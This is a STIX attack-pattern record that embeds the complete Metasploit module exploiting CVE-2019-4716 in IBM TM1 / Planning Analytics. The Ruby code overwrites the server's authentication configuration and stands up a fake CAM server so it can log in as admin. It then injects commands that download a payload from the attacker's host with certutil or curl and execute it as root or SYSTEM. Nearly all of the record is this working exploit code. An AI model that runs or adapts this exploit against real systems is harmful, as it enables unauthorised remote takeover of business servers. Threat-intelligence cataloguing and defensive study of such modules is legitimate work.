{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a2d7f0d2-11ba-4c40-ba50-d4b129e19fda",
    "created": "2024-08-14T17:06:38.021399Z",
    "modified": "2024-08-14T17:06:38.021403Z",
    "name": "IBM TM1 / Planning Analytics Unauthenticated Remote Code Execution",
    "description": " This module exploits a vulnerability in IBM TM1 / Planning Analytics that allows an unauthenticated attacker to perform a configuration overwrite. It starts by querying the Admin server for the available applications, picks one and then exploits it. You can also provide an application name to bypass this step and exploit the application directly. The configuration overwrite is used to change an application server authentication method to \"CAM\", a proprietary IBM auth method, which is simulated by the exploit. The exploit then performs a fake authentication as admin, and finally abuses TM1 scripting to perform a command injection as root or SYSTEM. Testing was done on IBM PA 2.0.6 and IBM TM1 10.2.2 on Windows and Linux. Versions up to and including PA 2.0.8 are vulnerable. It is likely that versions earlier than TM1 10.2.2 are also vulnerable (10.2.2 was released in 2014).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/ibm_tm1_unauth_rce.rb",
            "external_id": "ibm_tm1_unauth_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-4716"
        },
        {
            "source_name": "reference",
            "url": "https://www.ibm.com/support/pages/node/1127781"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_tm1_rce.md"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2020/Mar/44"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'IBM TM1 / Planning Analytics Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits a vulnerability in IBM TM1 / Planning Analytics that allows\n          an unauthenticated attacker to perform a configuration overwrite.\n          It starts by querying the Admin server for the available applications, picks one,\n          and then exploits it. You can also provide an application name to bypass this step,\n          and exploit the application directly.\n          The configuration overwrite is used to change an application server authentication\n          method to \"CAM\", a proprietary IBM auth method, which is simulated by the exploit.\n          The exploit then performs a fake authentication as admin, and finally abuses TM1\n          scripting to perform a command injection as root or SYSTEM.\n          Testing was done on IBM PA 2.0.6 and IBM TM1 10.2.2 on Windows and Linux.\n          Versions up to and including PA 2.0.8 are vulnerable. It is likely that versions\n          earlier than TM1 10.2.2 are also vulnerable (10.2.2 was released in 2014).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Pedro Ribeiro <pedrib@gmail.com>',\n          # Vulnerability discovery and Metasploit module\n          'Gareth Batchelor <gbatchelor@cloudtrace.com.au>'\n          # Real world exploit testing and feedback\n        ],\n        'References' => [\n          [ 'CVE', '2019-4716' ],\n          [ 'URL', 'https://www.ibm.com/support/pages/node/1127781' ],\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_tm1_rce.md' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2020/Mar/44' ]\n        ],\n        'Targets' => [\n          [\n            'Windows',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64]\n            }\n          ],\n          [\n            'Windows (Command)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_CMD],\n              'Payload' =>\n              {\n                # Plenty of bad chars in Windows... there might be more lurking\n                'BadChars' => \"\\x25\\x26\\x27\\x3c\\x3e\\x7c\"\n              }\n            }\n          ],\n          [\n            'Linux',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64]\n            }\n          ],\n          [\n            'Linux (Command)',\n            {\n              'Platform' => 'unix',\n              'Arch' => [ARCH_CMD],\n              'Payload' =>\n              {\n                # only one bad char in Linux, baby! (that we know of...)\n                'BadChars' => \"\\x27\"\n              }\n            }\n          ],\n          [\n            'AIX (Command)',\n            {\n              # This should work on AIX, but it was not tested!\n              'Platform' => 'unix',\n              'Arch' => [ARCH_CMD],\n              'Payload' =>\n              {\n                # untested, but assumed to be similar to Linux\n                'BadChars' => \"\\x27\"\n              }\n            }\n          ],\n        ],\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        # we need this to run in the foreground\n        'DefaultOptions' => {\n          # give the target lots of time to download the payload\n          'WfsDelay' => 30\n        },\n        'Privileged' => true,\n        'DisclosureDate' => '2019-12-19',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ CONFIG_CHANGES, ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(5498),\n        OptBool.new('SSL', [true, 'Negotiate SSL/TLS', true]),\n      ]\n    )\n    register_advanced_options [\n      OptString.new('APP_NAME', [false, 'Name of the target application']),\n      OptInt.new('AUTH_ATTEMPTS', [true, 'Number of attempts to auth to CAM server', 10]),\n    ]\n  end\n\n  ## Packet structure start\n  # these are client message types\n  MSG_TYPES = {\n    auth: [ 0x0, 0x1 ],\n    auth_uniq: [ 0x0, 0x3 ],\n    auth_1001: [ 0x0, 0x4 ],\n    auth_cam_pass: [ 0x0, 0x8 ],\n    auth_dist: [ 0x0, 0xa ],\n    obj_register: [ 0, 0x21 ],\n    obj_prop_set: [ 0, 0x25 ],\n    proc_create: [ 0x0, 0x9c ],\n    proc_exec: [ 0x0, 0xc4 ],\n    get_config: [ 0x1, 0x35 ],\n    upd_clt_pass: [ 0x1, 0xe2 ],\n    upd_central: [ 0x1, 0xae ]\n  }.freeze\n\n  # packet header is universal for both client and server\n  PKT_HDR = [ 0, 0, 0xff, 0xff ].freeze\n\n  # pkt end marker (client only, server responses do not have it)\n  PKT_END = [ 0xff, 0xff ].freeze\n\n  # empty auth object, used for operations that do not require auth\n  AUTH_OBJ_EMPTY = [ 5, 3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ].freeze\n\n  # This is actually the client version number\n  # 0x6949200 = 110400000 in decimal, or version 11.4\n  # The lowest that version 11.4 seems to accept is 8.4, so leave that as the default\n  # 8.4 = 0x4CACE80\n  # 9.1 = 0x55ED120\n  # 9.4 = 0x5636500\n  # 10.1 = 0x5F767A0\n  # 10.4 = 0x5FBFB80\n  # 11.1 = 0x68FFE20\n  # 11.4 = 0x6949200\n  #\n  # If something doesn't work, try using one of the values above, but bear in mind this module\n  # was tested on 10.2.2 and 11.4,\n  VERSION = [ 0x03, 0x04, 0xca, 0xce, 0x80 ].freeze\n  ## Packet structure end\n\n  ## Network primitives start\n  # unpack a string (hex string to array of bytes)\n  def str_unpack(str)\n    arr = []\n    str.scan(/../).each do |b|\n      arr += [b].pack('H*').unpack('C*')\n    end\n    arr\n  end\n\n  # write strings directly to socket; each 2 string chars are a byte\n  def sock_rw_str(sock, msg_str)\n    sock_rw(sock, str_unpack(msg_str))\n  end\n\n  # write array to socket and get result\n  # wait should also be implemented in msf\n  def sock_rw(sock, msg, ignore: false, wait: 0)\n    sock.write(msg.pack('C*'))\n    if !ignore\n      sleep(wait)\n      recv_sz = sock.read(2).unpack('H*')[0].to_i(16)\n      bytes = sock.read(recv_sz - 2).unpack('H*')[0]\n      bytes\n    end\n  end\n\n  def sock_r(sock)\n    recv_sz = sock.read(2).unpack('H*')[0].to_i(16)\n    bytes = sock.read(recv_sz - 2).unpack('H*')[0]\n    bytes\n  end\n\n  def get_socket(app_host, app_port, ssl = 0)\n    begin\n      ctx = { 'Msf' => framework, 'MsfExploit' => self }\n      sock = Rex::Socket.create_tcp(\n        { 'PeerHost' => app_host, 'PeerPort' => app_port, 'Context' => ctx, 'Timeout' => 10 }\n      )\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError\n      sock.close if sock\n    end\n    if sock.nil?\n      fail_with(Failure::Unknown, 'Failed to connect to the chosen application')\n    end\n    if ssl == 1\n      # also need to add support for old ciphers\n      ctx = OpenSSL::SSL::SSLContext.new\n      ctx.min_version = OpenSSL::SSL::SSL3_VERSION\n      ctx.security_level = 0\n      ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE\n      s = OpenSSL::SSL::SSLSocket.new(sock, ctx)\n      s.sync_close = true\n      s.connect\n      return s\n    end\n    return sock\n  end\n  ## Network primitives end\n\n  ## Packet primitives start\n  def pack_sz(sz)\n    [sz].pack('n*').unpack('C*')\n  end\n\n  # build a packet, ready to send\n  def pkt_build(msg_type, auth_obj, contents)\n    pkt = PKT_HDR + msg_type + auth_obj + contents + PKT_END\n    pack_sz(pkt.length + 2) + pkt\n  end\n\n  # extracts the first object from a server response\n  def obj_extract(res)\n    arr = str_unpack(res)\n\n    # ignore packet header (4 bytes)\n    arr.shift(PKT_HDR.length)\n    if arr[0] == 5\n      # this is an object, get the type (1 byte) plus the object bytes (9 bytes)\n      obj = arr[0..9]\n      obj\n    end\n  end\n\n  # adds a string to a packet\n  # C string = 0x2; utf string = 0xe; binary = 0xf\n  def stradd(str, type = 0xe)\n    arr = [ type ] # string type\n    arr += pack_sz(str.length)\n    arr += str.unpack('C*')\n    arr\n  end\n\n  # packs binary data into an array\n  def datapack(data)\n    arr = []\n    data.chars.each do |d|\n      arr << d.ord\n    end\n    arr\n  end\n\n  def binadd(data)\n    arr = [ 0xf ]                     # binary type 0xf\n    arr += pack_sz(data.length)       # 2 byte size\n    arr += datapack(data)             # ... and add the data\n    arr\n  end\n\n  def get_str(data)\n    s = ''\n    data.shift while data[0] != '\"'.ord\n    data.shift\n    while data[0] != '\"'.ord\n      s += data[0].chr\n      data.shift\n    end\n    # comma\n    data.shift\n    s\n  end\n\n  # This fetches the current IntegratedSecurityMode from a packet such as\n  # 0000ffff070000000203000000 01 07000000020e00000e0000                  (1)\n  # 0000ffff070000000203000000 02 07000000020e00000e00084b65726265726f73  (2)\n  # 0000ffff070000000203000000 06 07000000010e0000                        (6)\n  def get_auth(data)\n    # make it into an array\n    data = str_unpack(data)\n    if data.length > 13\n      # skip 13 bytes (header + array indicator + index indicator)\n      data.shift(13)\n      # fetch the auth method byte\n      data[0]\n    end\n  end\n\n  def update_auth(auth_method, restore: false)\n    # first byte of data is ignored, so add an extra space\n    if restore\n      srv_config = \" IntegratedSecurityMode=#{auth_method}\"\n    else\n      # To enable CAM server authentication over SSL, the CAM server certificate has to be previously\n      # imported into the server. Since we can't do this, disable SSL in the fake CAM.\n      srv_config = \" IntegratedSecurityMode=#{auth_method}\\n\" \\\n                   \"ServerCAMURI=http://#{srvhost}:#{srvport}\\n\" \\\n                   \"ServerCAMURIRetryAttempts=10\\nServerCAMIPVersion=ipv4\\n\" \\\n                   \"CAMUseSSL=F\\n\"\n    end\n\n    arr =\n      [ 3 ] + [ 0, 0, 0, 2 ] +                             # no idea what this index is\n      [ 3 ] + [ 0, 0, 0, 2 ] +                             # same here\n      [ 3 ] + [ 0 ] * 4 +                                  # same here\n      stradd(rand_text_alpha(5..12)) +                     # same here...\n      stradd('tm1s_delta.cfg') +                           # update file name\n      binadd(srv_config) +                                 # file data\n      stradd(rand_text_alpha(0xf))                         # last sync timestamp, max len 0xf\n\n    upd_auth = pkt_build(\n      MSG_TYPES[:upd_central],\n      AUTH_OBJ_EMPTY,\n      [ 7 ] +                                   # array type\n      [ 0, 0, 0, 7 ] +                          # array len (fixed size of 7 for this pkt)\n      arr\n    )\n\n    upd_auth\n  end\n  ## Packet primitives end\n\n  ## CAM HTTP functions start\n  def on_request_uri(cli, request)\n    xml_res = %(<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:ns1=\"http://developer.cognos.com/schemas/dataSourceCommandBlock/1/\" xmlns:bus=\"http://developer.cognos.com/schemas/bibus/3/\" xmlns:cm=\"http://developer.cognos.com/schemas/contentManagerService/1\" xmlns:ns10=\"http://developer.cognos.com/schemas/indexUpdateService/1\" xmlns:ns11=\"http://developer.cognos.com/schemas/jobService/1\" xmlns:ns12=\"http://developer.cognos.com/schemas/metadataService/1\" xmlns:ns13=\"http://developer.cognos.com/schemas/mobileService/1\" xmlns:ns14=\"http://developer.cognos.com/schemas/monitorService/1\" xmlns:ns15=\"http://developer.cognos.com/schemas/planningAdministrationConsoleService/1\" xmlns:ns16=\"http://developer.cognos.com/schemas/planningRuntimeService/1\" xmlns:ns17=\"http://developer.cognos.com/schemas/planningTaskService/1\" xmlns:ns18=\"http://developer.cognos.com/schemas/reportService/1\" xmlns:ns19=\"http://developer.cognos.com/schemas/systemService/1\" xmlns:ns2=\"http://developer.cognos.com/schemas/agentService/1\" xmlns:ns3=\"http://developer.cognos.com/schemas/batchReportService/1\" xmlns:ns4=\"http://developer.cognos.com/schemas/dataIntegrationService/1\" xmlns:ns5=\"http://developer.cognos.com/schemas/dataMovementService/1\" xmlns:ns6=\"http://developer.cognos.com/schemas/deliveryService/1\" xmlns:ns7=\"http://developer.cognos.com/schemas/dispatcher/1\" xmlns:ns8=\"http://developer.cognos.com/schemas/eventManagementService/1\" xmlns:ns9=\"http://developer.cognos.com/schemas/indexSearchService/1\">\n    <SOAP-ENV:Body SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n      <cm:queryResponse>\n        <result baseClassArray xsi:type=\"SOAP-ENC:Array\" SOAP-ENC:arrayType=\"tns:baseClass[1]\">\n        PLACEHOLDER\n        </result>\n      </cm:queryResponse>\n    </SOAP-ENV:Body>\n    </SOAP-ENV:Envelope>)\n\n    session =\n      %(   <item xsi:type=\"bus:session\">\n            <identity>\n              <value baseClassArray xsi:type=\"SOAP-ENC:Array\" SOAP-ENC:arrayType=\"tns:baseClass[1]\">\n                <item xsi:type=\"bus:account\">\n                  <searchPath><value>admin</value></searchPath>\n                </item>\n              </value>\n            </identity>\n          </item>)\n\n    account =\n      %(   <item xsi:type=\"bus:account\">\n            <defaultName><value>admin</value></defaultName>\n          </item>)\n\n    headers = { 'SOAPAction' => '\"http://developer.cognos.com/schemas/contentManagerService/1\"' }\n    if request.body.include? '<searchPath>/</searchPath>'\n      print_good('CAM: Received first CAM query, responding with account info')\n      response = xml_res.sub('PLACEHOLDER', account)\n    elsif request.body.include? '<searchPath>~~</searchPath>'\n      print_good('CAM: Received second CAM query, responding with session info')\n      response = xml_res.sub('PLACEHOLDER', session)\n    elsif request.body.include? '<searchPath>admin</searchPath>'\n      print_good('CAM: Received third CAM query, responding with random garbage')\n      response = rand_text_alpha(5..12)\n    elsif request.method == 'GET'\n      print_good('CAM: Received request for payload executable, shell incoming!')\n      response = @pl\n      headers = { 'Content-Type' => 'application/octet-stream' }\n    else\n      response = ''\n      print_error('CAM: received unknown request')\n    end\n    send_response(cli, response, headers)\n  end\n  ## CAM HTTP functions end\n\n  def restore_auth(app, auth_current)\n    print_status(\"Restoring original authentication method #{auth_current}\")\n    upd_cent = update_auth(auth_current, restore: true)\n    s = get_socket(app[2], app[3], app[5])\n    sock_rw(s, upd_cent, ignore: true)\n    s.close\n  end\n\n  def exploit\n    # first let's check if SRVHOST is valid\n    if datastore['SRVHOST'] == '0.0.0.0'\n      fail_with(Failure::Unknown, 'Please enter a valid IP address for SRVHOST')\n    end\n\n    # The first step is to query the administrative server to see what apps are available.\n    # This action can be done unauthenticated. We then list all the available app servers\n    # and pick a random one that is currently accepting clients. This step is important\n    # not only to know what app servers are available, but also to know if we need to use\n    # SSL or not.\n    # The admin server is usually at 5498 using SSL. Non-SSL access is disabled by default, but when enabled, it's available at port 5495\n    #\n    # Step 1: fetch the available applications / servers from the Admin server\n    # ... if the user did not enter an APP_NAME\n    if datastore['APP_NAME'].nil?\n      connect\n      print_status('Connecting to admin server and obtaining application data')\n\n      # for this packet we use string type 0xc (?) and cut off the PKT_END\n      pkt_control = PKT_HDR + [0] + stradd(lhost, 0xc)\n      pkt_control = pack_sz(pkt_control.length + 2) + pkt_control\n      data = sock_rw(sock, pkt_control)\n      disconnect\n\n      if data\n        # now process the response\n        apps = []\n\n        data = str_unpack(data)\n\n        # ignore packet header (4 bytes)\n        data.shift(PKT_HDR.length)\n\n        # now just go through the list we received, sample format below\n        # \"24retail\",\"tcp\",\"10.11.12.123\",\"17414\",\"1460\",\"1\",\"127.0.0.1,127.0.0.1,127.0.0.1\",\"1\",\"0\",\"\",\"\",\"\",\"0\",\"\",\"0\",\"\",\"ipv4\",\"22\",\"0\",\"2\",\"http://centos7.doms.com:8014\",\"8014\"\n        # \"GO_New_Stores\",\"tcp\",\"10.11.12.123\",\"45557\",\"1460\",\"0\",\"127.0.0.1,127.0.0.1,127.0.0.1\",\"1\",\"1\",\"\",\"\",\"\",\"0\",\"\",\"0\",\"\",\"ipv4\",\"23\",\"0\",\"2\",\"https://centos7.doms.com:5010\",\"5010\"\n        # \"GO_Scorecards\",\"tcp\",\"10.11.12.123\",\"44321\",\"1460\",\"0\",\"127.0.0.1,127.0.0.1,127.0.0.1\",\"1\",\"1\",\"\",\"\",\"\",\"0\",\"\",\"0\",\"\",\"ipv4\",\"22\",\"0\",\"2\",\"https://centos7.doms.com:44312\",\"44312\"\n        # \"Planning Sample\",\"tcp\",\"10.11.12.123\",\"12345\",\"1460\",\"0\",\"127.0.0.1,127.0.0.1,127.0.0.1\",\"1\",\"1\",\"\",\"\",\"\",\"0\",\"\",\"0\",\"\",\"ipv4\",\"22\",\"0\",\"2\",\"https://centos7.doms.com:12354\",\"12354\"\n        # \"proven_techniques\",\"tcp\",\"10.11.12.123\",\"53333\",\"1460\",\"0\",\"127.0.0.1,127.0.0.1,127.0.0.1\",\"1\",\"1\",\"\",\"\",\"\",\"0\",\"\",\"0\",\"\",\"ipv4\",\"22\",\"0\",\"2\",\"https://centos7.doms.com:5011\",\"5011\"\n        # \"SData\",\"tcp\",\"10.11.12.123\",\"12346\",\"1460\",\"0\",\"127.0.0.1,127.0.0.1,127.0.0.1\",\"1\",\"1\",\"\",\"\",\"\",\"0\",\"\",\"0\",\"\",\"ipv4\",\"22\",\"0\",\"2\",\"https://centos7.doms.com:8010\",\"8010\"\n        while !data.nil? && (data.length > 2)\n          # skip the marker (0x0, 0x5) that indicates the start of a new app\n          data = data[2..]\n\n          # read the size and fetch the data\n          size = data[0..1].pack('C*').unpack('H*')[0].to_i(16)\n          data_next = data[2 + size..]\n          data = data[2..size]\n\n          # first is application name\n          app_name = get_str(data)\n\n          # second is protocol, we don't care\n          proto = get_str(data)\n\n          # third is IP address\n          ip = get_str(data)\n\n          # app port\n          port = get_str(data)\n\n          # mtt maybe? don't care\n          _mtt = get_str(data)\n\n          # not sure, and don't care\n          _unknown = get_str(data)\n\n          # localhost addresses? again don't care\n          _unknown_addr = get_str(data)\n\n          # I think this is the accepting clients flag\n          accepts = get_str(data)\n\n          # and this is a key one, the SSL flag\n          ssl = get_str(data)\n\n          # the leftover data is related to the REST API *I think*, so we just ignore it\n\n          print_good(\"Found app #{app_name} #{proto} ip: #{ip} port: #{port} available: #{accepts} SSL: #{ssl}\")\n          apps.append([app_name, proto, ip, port.to_i, accepts.to_i, ssl.to_i])\n\n          data = data_next\n        end\n      else\n        fail_with(Failure::Unknown, 'Failed to obtain application data from the admin server')\n      end\n\n      # now pick a random application server that is accepting clients via TCP\n      app = apps.sample\n      total = apps.length\n      count = 0\n\n      # TODO: check for null return here, and probably also response size > 0x20\n      while (app[1] != 'tcp') && (app[4] != 1) && (count < total)\n        app = apps.sample\n        count += 1\n      end\n\n      if count == total\n        fail_with(Failure::Unknown, 'Failed to find an application we can attack')\n      end\n      print_status(\"Picked #{app[0]} as our target, connecting...\")\n\n    else\n      # else if the user entered an APP_NAME, build the app struct with that info\n      ssl = datastore['SSL']\n      app = [datastore['APP_NAME'], 'tcp', rhost, rport, 1, (ssl ? 1 : 0)]\n      print_status(\"Attacking #{app[0]} on #{peer} as requested with TLS #{ssl ? 'on' : 'off'}\")\n    end\n\n    s = get_socket(app[2], app[3], app[5])\n\n    # Step 2: get the current app server configuration variables, such as the current auth method used\n    get_conf = stradd(app[0])\n    get_conf += VERSION\n    auth_get = pkt_build(MSG_TYPES[:get_config], AUTH_OBJ_EMPTY, get_conf)\n    data = sock_rw(s, auth_get)\n    auth_current = get_auth(data)\n\n    print_good(\"Current auth method is #{auth_current}, we're good to go!\")\n    s.close\n\n    # Step 3: start the fake CAM server / exploit server\n    if payload.arch.include? ARCH_CMD\n      @pl = ''\n    else\n      @pl = generate_payload_exe\n    end\n\n    # do not use SSL for the CAM server!\n    if datastore['SSL']\n      ssl_restore = true\n      datastore['SSL'] = false\n    end\n\n    print_status('Starting up the fake CAM server...')\n    start_service(\n      {\n        'Uri' => {\n          'Proc' => proc do |cli, req|\n            on_request_uri(cli, req)\n          end,\n          'Path' => '/'\n        }\n      }\n    )\n    datastore['SSL'] = true if ssl_restore\n\n    # Step 4: send the server config update packet, and ignore what it sends back\n    print_status('Changing authentication method to 4 (CAM auth)')\n    upd_cent = update_auth(4)\n    s = get_socket(app[2], app[3], app[5])\n    sock_rw(s, upd_cent, ignore: true)\n    s.close\n\n    # Step 5: send the CAM auth request and obtain the authentication object\n    # app name\n    auth_pkt = stradd(app[0])\n\n    auth_pkt += [ 0x7, 0, 0, 0, 3 ] # array with 3 objects\n\n    # passport, can be random\n    auth_pkt += stradd(rand_text_alpha(5..12))\n\n    # no idea what these vars are, but they don't seem to matter\n    auth_pkt += stradd(rand_text_alpha(5..12))\n    auth_pkt += stradd(rand_text_alpha(5..12))\n\n    # client IP\n    auth_pkt += stradd(lhost)\n\n    # add the client version number\n    auth_pkt += VERSION\n\n    auth_dist = pkt_build(MSG_TYPES[:auth_cam_pass], AUTH_OBJ_EMPTY, auth_pkt)\n\n    print_status('Authenticating using CAM Passport and our fake CAM Service...')\n    s = get_socket(app[2], app[3], app[5])\n\n    # try to authenticate up to AUTH_ATTEMPT times, but usually it works the first try\n    # adjust the 4th parameter to sock_rw to increase the timeout if it's not working and / or the CAM server is on another network\n    counter = 1\n    res_auth = ''\n    while (counter < datastore['AUTH_ATTEMPTS'])\n      # send the authenticate request, but wait a bit so that our fake CAM server can respond\n      res_auth = sock_rw(s, auth_dist, ignore: false, wait: 0.5)\n      if res_auth.length < 20\n        print_error(\"Failed to authenticate on attempt number #{counter}, trying again...\")\n        counter += 1\n        next\n      else\n        break\n      end\n    end\n    if counter == datastore['AUTH_ATTEMPTS']\n      # if we can't auth, bail out, but first restore the old auth method\n      s.close\n      # restore_auth(app, auth_current)\n      fail_with(Failure::Unknown, 'Failed to authenticate to the Application server. Run the exploit and try again!')\n    end\n\n    auth_obj = obj_extract(res_auth)\n\n    # Step 6: create a Process object\n    print_status('Creating our Process object...')\n    proc_obj = obj_extract(sock_rw(s, pkt_build(MSG_TYPES[:proc_create], auth_obj, [])))\n\n    if payload.arch == ['cmd']\n      cmd_one = payload.encoded\n      cmd_two = ''\n    else\n      payload_url = \"http://#{srvhost}:#{srvport}/\"\n      exe_name = rand_text_alpha(5..13)\n      if target['Platform'] == 'win'\n        # the Windows command has to be split amongst two lines; the & char cannot be used to execute two processes in one line\n        exe_name += '.exe'\n        exe_name = \"C:\\\\Windows\\\\Temp\\\\#{exe_name}\"\n        cmd_one = \"certutil.exe -urlcache -split -f #{payload_url} #{exe_name}\"\n        cmd_two = exe_name\n      else\n        # the Linux one can actually be done in one line, but let's make them similar\n        exe_name = \"/tmp/#{exe_name}\"\n        cmd_one = \"curl #{payload_url} -o #{exe_name};\"\n        cmd_two = \"chmod +x #{exe_name}; exec #{exe_name}\"\n      end\n\n      register_file_for_cleanup(exe_name)\n    end\n\n    proc_cmd =\n      [ 0x3, 0, 0, 2, 0x3c ] +                        # no idea what this index is\n      [ 0x7, 0, 0, 0, 2 ] +                           # array with 2 objects (2 line script)\n      # the first argument is the command\n      # the second whether it should wait (1) or not (0) for command completion before returning\n      stradd(\"executecommand('#{cmd_one}', #{cmd_two.empty? ? '0' : '1'});\") +\n      stradd(\"executecommand('#{cmd_two}', 0);\")\n\n    # Step 7: add the commands into the process object\n    print_status(\"Adding command: \\\"#{cmd_one}\\\" to the Process object...\")\n    if cmd_two != ''\n      print_status(\"Adding command: \\\"#{cmd_two}\\\" to the Process object...\")\n    end\n    sock_rw(s, pkt_build(MSG_TYPES[:obj_prop_set], [], proc_obj + proc_cmd))\n\n    # Step 8: register the Process object with a random name\n    obj_name = rand_text_alpha(5..12)\n    print_status(\"Registering the Process object under the name '#{obj_name}'\")\n    proc_obj = obj_extract(sock_rw(s, pkt_build(MSG_TYPES[:obj_register], auth_obj, proc_obj + stradd(obj_name))))\n\n    # Step 9: execute the Process!\n    print_status(\"Now let's execute the Process object!\")\n    sock_rw(s, pkt_build(MSG_TYPES[:proc_exec], [], proc_obj + [ 0x7 ] + [ 0 ] * 4), ignore: true)\n    s.close\n\n    # Step 10: restore the auth method and enjoy the shell!\n    restore_auth(app, auth_current)\n\n    if payload.arch.include? ARCH_CMD\n      print_good('Your command should have executed by now, enjoy!')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-12-19",
    "x_mitre_platforms": [
        "unix'"
    ]
}